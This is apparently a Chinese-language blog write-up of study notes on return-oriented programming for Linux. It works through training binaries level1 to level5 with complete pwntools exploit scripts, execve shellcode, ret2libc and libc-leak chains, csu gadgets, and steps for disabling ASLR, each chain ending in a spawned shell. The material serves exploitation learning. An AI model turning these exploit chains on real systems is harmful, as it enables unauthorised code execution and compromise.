>课本地址：https://segmentfault.com/a/1190000005888964
>
>笔记中所用到的程序&脚本下载地址：https://github.com/zhengmin1989/ROP_STEP_BY_STEP(原作者github仓库)
>
>本文首发于：https://www.mrskye.cn

# 一步一步学ROP之Linux篇 - 学习笔记


## 基础介绍

ROP 的全称为 Return-oriented programming （返回导向编程）。是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）

## x86篇

### level 1 - 栈上执行shellcode

常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出。最常见的防御方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。下面看看这题，程序流劫持。

初学阶段，先关闭Linux系统的ASLR保护：

```shell
sudo -S
echo 0 > /proc/sys/kernel/randomize_va_space
exit
```

下载``level1``题目，放入到IDA分析，在``vulnerable_function()``中存在着栈溢出（0x100>88）

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5rop.png)

运行程序，输入一串字符串然后返回helloworld；file查看是个动态链接的32位文件；checksec查看所有安全编译选项都没有开

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191106224653.png)

然后就是确认溢出点（栈的eip）的位置，使用作者提供的``pattern.py``脚本进行计算。创建200字节的测试字符串

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191106225249.png)

然后``gdb ./level1``调试程序，``r``运行程序后输入测试字符串，得到内存出错地址：

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191106225456.png)

查询偏移量，这里的偏移量是指从变量写入处到eip顶内存长度。

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191106225615.png)

当然，可以自己手动计算。偏移量=0x88+0x4=140。0x4为ebp，0x88为变量空间。

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5rop.png)

只要构造一个`[shellcode][“AAAAAAAAAAAAAA”….][ret]`字符串，就可以让pc执行ret地址上的代码了。也就是需要知道shellcode所在的内存地址

这里注意的是用gdb调试程序，然后查内存来确定的shellcode所在位置，是错误的。因为gdb会影响buf的内存位置，即使是关闭ALSR。解决办法之一就是开启 ``core dump``

```shell
ulimit -c unlimited
sudo sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'
```

开启之后，再次输入测试字符串（或长度大于144的字符串），因此程序内存错误，使系统在``/tmp``生成一个``core dump``文件。用gdb查看这个core文件得到真正的buf地址（本机是0xffffcec0，每台机不一样，请实际操作一下）。

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191106235329.png)

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191106235400.png)

本地EXP

> 函数、gadget等地址，可能因电脑不同而不一致。请动手操作，获取本机相关地址后，自行替换

```python
#encoding:utf-8
from pwn import *

context.log_level = 'debug'

p = process("./level1")

ret_address = 0xffffcec0 # 请修改为你获取的shellcode所在的内存地址
# shellcode 可以用msf生成，或者去github找一个，注意长度!
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

payload = shellcode + 'a'*(0x88+0x4-len(shellcode)) + p32(ret_address)

p.send(payload) 
p.interactive() # 释放控制权
```

有可能脚本还是不能成功getshell，很大概率是ret的地址错了。我们再一次查找地址，这次加载的最新的core文件（后缀大的）。

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191107092018.png)

替换为该地址，即可。

除了本地调试，还有远程部署的方式，如下，将题目绑定到指定端口上：

```
socat tcp-l:10001,fork exec:./level1
```

payload除了将p = process(“./level1”)改为p = remote(“127.0.0.1”, 10001)外，ret的地址还会发生改变。解决方法还是采用生成core dump的方案，然后用gdb调试core文件获取返回地址，即可远程getshell。



### level 2  - ret2libc 绕过 DEP 防护

使用``checksec``检查题目``level2``，发现打开了NX保护（栈不可执行），也就是说不能像上一题将shellcode写到栈上后执行。

每个程序都会调用函数库``libc.so``，而shellcode的执行效果等于``system("/bin/sh")``，问题就是如何获得system和"/bin/sh"的地址。

我们关闭了系统的ASLR，函数在内存的地址不会变换，字符串也是固定的。这时可以使用gdb进行调试，通过``print``和``find``命令查找。

gdb打开后，首先在main函数上打下断点，然后运行程序，让libc.so函数加载到内存中。使用``print system``获取system函数的真实地址；使用``print __libc_start_main``获取libc.so起始地址。使用``find [起始地址],[+搜索长度],[字符串]``获取"/bin/sh"内存地址。

```shell
$ gdb level2
'''
gef➤  b main
Breakpoint 1 at 0x8048430
gef➤  r
Starting program: /home/skye/rop/level2/level2
Breakpoint 1, 0x08048430 in main ()
gef➤  print system
$1 = {int (const char *)} 0xf7e19200 <__libc_system>
gef➤  print __libc_start_main
$2 = {int (int (*)(int, char **, char **), int, char **, int (*)(int, char **, char **), void (*)(void), void (*)(void), void *)} 0xf7df4d90 <__libc_start_main>
gef➤  find 0xf7df4d90,+2200000,"/bin/sh"
0xf7f5a0cf
warning: Unable to access 16000 bytes of target memory at 0xf7fb7cd7, halting search.
1 pattern found.
```

本地EXP

> 函数、gadget等地址，可能因电脑不同而不一致。请动手操作，获取本机相关地址后，自行替换

```python
#coding:utf-8
from pwn import *

context.log_level = 'debug'
p = process("./level2")

system_addr = 0xf7e19200
binsh_addr = 0xf7f5a0cf
ret = 0xdeadbeef

payload = 'a'*140 + p32(system_addr) + p32(ret) + p32(binsh_addr)

p.send(payload)
p.interactive()
```



### level 2  - 通过 ROP 绕过 DEP 和 ASLR 防护

打开ALSR保护：

```shell
sudo -s
echo 2 > /proc/sys/kernel/randomize_va_space
```

开ALSR之后，我们每次从gdb中查找的地址都是变化的。但是程序本身在内存中的地址并不是随机的。如图所示：

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191107140517.png)

思路是：我们泄露出libc.so某些函数在内存中地址，然后利用泄露出来的函数地址根据函数的偏移量计算得出system()和"/bin/sh"的内存地址，然后执行system("/bin/sh")

由于题目没有给出libc.so，使用``ldd``命令查询程序调用的函数库，然后将函数库文件拷贝当前目录

```shell
$ ldd level2
	linux-gate.so.1 (0xf7fd4000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7ddc000)
	/lib/ld-linux.so.2 (0xf7fd6000)
$ sudo cp /lib/i386-linux-gnu/libc.so.6 libc.so
```

利用objdump查看程序的plt和got表，因为我们只能先利用程序所使用的函数，去泄露对应的地址。（图一.plt表，图二.got表）

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191107142252.png)

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191107142806.png)

这里我们使用``write@plt()``函数把存储在``write@GLIBC_2.0``(或称``write.got``)的``write()``函数的内存地址打印出来。然后计算system()和"/bin/sh"与write()在函数库libc.so中的offset（相对地址）得到最后的地址。

> Q: 为什么用的是调用write@plt()打印write@got()？
>
> A:`write()`函数实现是在`libc.so`当中，那我们调用的`write@plt()`函数为什么也能实现`write()`功能呢? 这是因为linux采用了延时绑定技术，当我们调用`write@plit()`的时候，系统会将真正的`write()`函数地址link到got表的`write.got`中，然后`write@plit()`会根据`write.got` 跳转到真正的`write()`函数上去。（如果还是搞不清楚的话，推荐阅读《程序员的自我修养 - 链接、装载与库》这本书）

再将pc指针return回`vulnerable_function()`函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了`system()`在内存中的地址，就可以调用`system()`函数来获取我们的shell了。

本地EXP

> 函数、gadget等地址，可能因电脑不同而不一致。请动手操作，获取本机相关地址后，自行替换

```python
# coding:utf-8
from pwn import *

context.log_level = 'debug'

elf = ELF("./level2")
libc = ELF("./libc.so")
p = process("./level2")

write_plt = elf.symbols['write'] # 获取程序中的write.plt
write_got = elf.got['write'] # 获取程序中的write.got
vulfun_addr = 0x08048404 # 漏洞函数地址
payload_1 = 'a'*140 + p32(write_plt) + p32(vulfun_addr) + p32(1) + p32(write_got) + p32(4)

p.send(payload_1)
write_addr = u32(p.recv(4)) # 接受返回的内存地址

libc_addr = write_addr - libc.symbols['write']
system_addr = libc_addr + libc.symbols['system']
binsh_addr = libc_addr + next(libc.search('/bin/sh')) # 寻找字符串地址
payload_2 = 'a'*140 + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)

p.send(payload_2)
p.interactive()
```



### level 2  - 在不获取目标libc.so的情况下进行ROP攻击

如果不能获取目标机器上的libc.so或者具体的linux版本号，应该怎么计算得出偏移地址（offset）？

利用DynELF模块通过内存泄露(memory leak)来搜索内存中的system()地址。需要的是一个``lead(address)``函数。由于DynELF模块只能取得system()地址，所以需要调用read()或其他函数，将``/bin/sh``写入到程序的非随机段（如.bss段）。通过``readelf -S level2``或者在IDA中快捷键``ctrl+s``获取到bss段的地址。

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191109230630.png)

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191109231111.png)

因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。利用的是ROPgadget工具快速查找可用gadget，``ROPgadget --binary level2 --only "pop|ret"``

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191109231537.png)

攻击思路：首先通过DynELF获取到system()地址，通过read()将“/bin/sh”写入到.bss段，通过gadget清空read()栈上参数后，调用system("/bin/sh")。

本地EXP

> 函数、gadget等地址，可能因电脑不同而不一致。请动手操作，获取本机相关地址后，自行替换

```python
#coding = utf-8
from pwn import *

elf = ELF('./level2')
plt_write = elf.symbols['write']
plt_read = elf.symbols['read']
vulfun_addr = 0x08048404 # 请根据实际而替换
bss_addr = 0x0804a018 # 请根据实际而替换 
pppr = 0x080484bd # 请根据实际而替换

def leak(address):
    payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
    p.send(payload1)
    data = p.recv(4)
    print "%#x => %s" % (address, (data or '').encode('hex'))
    return data

p = process('./level2')

d = DynELF(leak, elf=ELF('./level2'))

system_addr = d.lookup('system', 'libc')
print "system_addr=" + hex(system_addr)

payload2 = 'a'*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) # 写入read部分
payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr) # 调用system部分

print "\n###sending payload2 ...###"
p.send(payload2)
p.send("/bin/sh\0")
p.interactive()
```



----



## linux_64与linux_86的区别

linux_64与linux_86的区别主要有两点：**首先是内存地址的范围由32位变成了64位**。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。**其次是函数参数的传递方式发生了改变**，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9中，如果还有更多的参数的话才会保存在栈上。



## x64篇

### level 3  -  通过 ROP 绕过 DEP 和 ASLR 防护

老样子，在漏洞函数中，存在着栈溢出。程序中也有预留的后门函数``callsystem``。思路就是利用栈溢出，覆写rip为后门函数内存地址``0x0000000000400584``。

![](https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191127233714.png)

这里计算溢出需要的覆写长度，不采取原文中的方法，而是通过IDA分析计算得出，具体计算如下：0x80 + 0x8 。覆写完成后的位置到达 rip 上一个内存空间。

最终exp如下：

```python
#!python
#!/usr/bin/env python
from pwn import *

elf = ELF('level3')

p = process('./level3')
#p = remote('127.0.0.1',10001)

callsystem = 0x0000000000400584

payload = "A"*136 + p64(callsystem)

p.send(payload)

p.interactive()
```



### level 4 - 使用ROPgadget寻找gadgets

x86 的参数都是保存在栈上（即栈传参）。而 x64 的前六个参数依次保存在RDI、RSI、RDX、RCX、R8 和 R9 寄存器中，还有更多的参数才会保存到栈上。所以如果我们需要传递少量的参数就需要用到``gadget``。简单的 gadget ，我们可以通过命令 ``objdump``查找，如果需要复杂的 gadget 时（或者说更加常用的），就需要借助诸如``ROPgadget、Ropper、ROPEME``等等查询工具。

使用命令``ROPgadget --binary level4 --only "pop|ret"``搜索一下 level 4 中所有 pop ret 的 gadget。就这个程序而言，太小了，找不到``pop rdi;ret``的 gadget。（不信你试试XD）

由于程序调用了``libc.so``，那我们就查查``libc.so``中有没有需要的 gadget 。首先，需要将使用的 libc 复制到工作目录。然后在使用 ROPgadget 查询。找到gadget之后，就可以构造ROP链。

```shell
# 查询使用的libc.so所在
ldd level4
# 复制 & 重命名
sudo cp /lib/x86_64-linux-gnu/libc.so.6 libc.so
ROPgadget --binary libc.so --only "pop|ret"
​```(省略)
0x0000000000021102 : pop rdi ; ret
​```(省略)
```

先填充栈空间，到达 rip 上一个内存空间。覆写为gadget地址，再接着是``/bin/sh``内存地址，这样就可以将``/bin/sh``存入到 rdi 寄存器。然后运行指针再跳转到 rip+0x10 (即system_addr被我们写入的位置)，执行``system("/bin/sh")``。最终构成的ROP链：

```python
payload = "\x00"*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)
```

最终 exp 构造如下：

```python
#!python
#!/usr/bin/env python
from pwn import *

libc = ELF('libc.so.6')

p = process('./level4')
#p = remote('127.0.0.1',10001)

binsh_addr_offset = next(libc.search('/bin/sh')) -libc.symbols['system']
print "binsh_addr_offset = " + hex(binsh_addr_offset)

pop_ret_offset = 0x0000000000022a12 - libc.symbols['system']
print "pop_ret_offset = " + hex(pop_ret_offset)

#pop_pop_call_offset = 0x00000000000f4739 - libc.symbols['system']
#print "pop_pop_call_offset = " + hex(pop_pop_call_offset)

print "\n##########receiving system addr##########\n"
system_addr_str = p.recvuntil('\n')
system_addr = int(system_addr_str,16)
print "system_addr = " + hex(system_addr)

binsh_addr = system_addr + binsh_addr_offset
print "binsh_addr = " + hex(binsh_addr)

pop_ret_addr = system_addr + pop_ret_offset
print "pop_ret_addr = " + hex(pop_ret_addr)

#pop_pop_call_addr = system_addr + pop_pop_call_offset
#print "pop_pop_call_addr = " + hex(pop_pop_call_addr)

p.recv()

payload = "\x00"*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr) 

#payload = "\x00"*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr) 

print "\n##########sending payload##########\n"
p.send(payload)

p.interactive()
```



### level 5 - 通用gadget

因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。

**level 5 仅仅只有一个栈溢出漏洞点**，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到 system() 的地址，然后再传递 /bin/sh 到 .bss 段。

> 为什么传递 /bin/sh 到 .bss段

最后调用 system(“/bin/sh”) 。因为原程序使用了 write() 和 read() 函数，我们可以通过 write() 去输出 write.got 的地址，从而计算出 libc.so 在内存中的地址。但问题在于 write() 的参数应该如何传递。我们使用 ROPgadget 并没有找到类似于 pop rdi, ret,pop rsi, ret 这样的 gadgets 。那应该怎么办呢？其实在 x64 下有一些万能的 gadgets 可以利用。

> 蒸米师傅提供编译好的文件和下面有点区别，下面是用相同源码在ubuntu 16.04 下编译，编译指令：gcc -fno-stack-protector -o level5 level5.c

使用命令``objdump -d level5``找到调用libc.so的初始化函数``__libc_csu_init()``。汇编代码如下：

```
00000000004005c0 <__libc_csu_init>:
  4005c0:	41 57                	push   %r15
  4005c2:	41 56                	push   %r14
  4005c4:	41 89 ff             	mov    %edi,%r15d
  4005c7:	41 55                	push   %r13
  4005c9:	41 54                	push   %r12
  4005cb:	4c 8d 25 3e 08 20 00 	lea    0x20083e(%rip),%r12        # 600e10 <__frame_dummy_init_array_entry>
  4005d2:	55                   	push   %rbp
  4005d3:	48 8d 2d 3e 08 20 00 	lea    0x20083e(%rip),%rbp        # 600e18 <__init_array_end>
  4005da:	53                   	push   %rbx
  4005db:	49 89 f6             	mov    %rsi,%r14
  4005de:	49 89 d5             	mov    %rdx,%r13
  4005e1:	4c 29 e5             	sub    %r12,%rbp
  4005e4:	48 83 ec 08          	sub    $0x8,%rsp
  4005e8:	48 c1 fd 03          	sar    $0x3,%rbp
  4005ec:	e8 0f fe ff ff       	callq  400400 <_init>
  4005f1:	48 85 ed             	test   %rbp,%rbp
  4005f4:	74 20                	je     400616 <__libc_csu_init+0x56>
  4005f6:	31 db                	xor    %ebx,%ebx
  4005f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4005ff:	00 
  400600:	4c 89 ea             	mov    %r13,%rdx
  400603:	4c 89 f6             	mov    %r14,%rsi
  400606:	44 89 ff             	mov    %r15d,%edi
  400609:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
  40060d:	48 83 c3 01          	add    $0x1,%rbx
  400611:	48 39 eb             	cmp    %rbp,%rbx
  400614:	75 ea                	jne    400600 <__libc_csu_init+0x40>
  400616:	48 83 c4 08          	add    $0x8,%rsp
  40061a:	5b                   	pop    %rbx
  40061b:	5d                   	pop    %rbp
  40061c:	41 5c                	pop    %r12
  40061e:	41 5d                	pop    %r13
  400620:	41 5e                	pop    %r14
  400622:	41 5f                	pop    %r15
  400624:	c3                   	retq   
  400625:	90                   	nop
  400626:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40062d:	00 00 00 
```

利用其中 0x40061a 开始的6行代码，我们可以控制寄存器``rbx,rbp,r12,r13,r14,r15``的值。随后可以利用 0x400600 开始的6行代码，将 r15 的值赋值给 rdx ， r14 的值赋值给 rsi ， r13 的值赋值给 edi 。随后就会调用call qword ptr [r12+rbx*8]。只要我们控制rbx的值为 0 ，精心构造栈上传入上述寄存器的值，就可以实现控制 pc ，调用我们想要的函数。

> 为什么需要控制 rbx 的值为0？
>
> 执行完 call qword ptr [r12+rbx*8] 之后，程序会对rbx+=1，然后对比 rbp 和 rbx 的值，如果相等就会继续向下执行并 ret 到我们想要继续执行的地址。所以为了让 rbp 和 rbx 的值相等，我们可以将 rbp 的值设置为1，因为之前已经将 rbx 的值设置为0了。

我们先构造 payload1 ，利用 write() 输出 write 在内存中的地址。注意我们的 gadget 是 call qword ptr [r12+rbx*8] ，所以我们应该使用 write.got 的地址而不是 write.plt 的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。

> 为什么使用的是 write.got 而不是 write.plt？
>
> write.plt 相当于 call write。执行了两个动作，将指针跳转到 write 真实地址；将返回地址压栈。
>
> write.got 仅将指针跳转到 write 真实地址。

payload1 构造如下：

```python
#rdi=  edi = r13,  rsi = r14, rdx = r15 
#write(rdi=1, rsi=write.got, rdx=4)
payload1 =  "\x00"*136
payload1 += p64(0x400606) + p64(0xdeadbeef) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload1 += "\x00"*56
payload1 += p64(main)
```

当我们 exp 在收到 write() 在内存中的地址后，就可以计算出 system() 在内存中的地址了。接着我们构造 payload2 ，利用 read() 将 system() 的地址以及 /bin/sh 读入到 .bss 段内存中。

payload2 构造如下：

```python
#rdi=  edi = r13,  rsi = r14, rdx = r15 
#read(rdi=0, rsi=bss_addr, rdx=16)
payload2 =  "\x00"*136
payload2 += p64(0x400606) + p64(0xdeadbeef) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload2 += "\x00"*56
payload2 += p64(main)
```

最后我们构造 payload3 ,调用 system() 函数执行 /bin/sh 。注意， system() 的地址保存在了 .bss 段首地址上， /bin/sh 的地址保存在了 .bss 段首地址+8字节上。

```python
#rdi=  edi = r13,  rsi = r14, rdx = r15 
#system(rdi = bss_addr+8 = "/bin/sh")
payload3 =  "\x00"*136
payload3 += p64(0x400606) + p64(0xdeadbeef) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload3 += "\x00"*56
payload3 += p64(main)
```

> 以上是蒸米文章阅读后的理解笔记

最终exp如下：

```python
from pwn import *

p = process('./level5')
#p = remote('192.168.17.155',10001)

elf = ELF('level5')
libc = elf.libc
main = elf.symbols['main']
bss_addr = elf.bss()

gadget1 = 0x40061a
gadget2 = 0x400600

got_write = elf.got['write']
print "[*]write() got: " + hex(got_write)
got_read = elf.got['read']
print "[*]read() got: " + hex(got_read)

def csu(rbx, rbp, r12, r13, r14, r15, ret):
	# pop rbx,rbp,r12,r13,r14,r15
	# rbx should be 0,
	# rbp should be 1,enable not to jump
	# r12 should be the function we want to call
	# rdi=edi=r15d
	# rsi=r14
	# rdx=r13
	payload = "A" * 136
	payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
	payload += p64(gadget2)
	payload += "B" * 56
	payload += p64(ret)
	return payload

#write(rdi=1, rsi=write.got, rdx=4)
payload1 = csu(0, 1, got_write, 8, got_write, 1, main)

p.recvuntil("Hello, World\n")

print "\n#############sending payload1#############\n"
p.send(payload1)
sleep(1)

write_addr = u64(p.recv(8))
print "[*]leak write() addr: " + hex(write_addr)

libc.address = write_addr - libc.symbols['write']
execve_addr = libc.symbols["execve"]
print "[*]execve() addr: " + hex(execve_addr)

p.recvuntil("Hello, World\n")

#read(rdi=0, rsi=bss_addr, rdx=16)
payload2 = csu(0, 1, got_read, 16, bss_addr, 0, main)

print "\n#############sending payload2#############\n"
p.send(payload2)
sleep(1)

p.send(p64(execve_addr))
p.send("/bin/sh\0")
sleep(1)

p.recvuntil("Hello, World\n")

#execve(rdi = bss_addr+8 = "/bin/sh", rsi=0, rdx=0)
payload3 = csu(0, 1, bss_addr, 0, 0, bss_addr + 8, main)

print "\n#############sending payload3#############\n"

sleep(1)
p.send(payload3)

p.interactive()
```
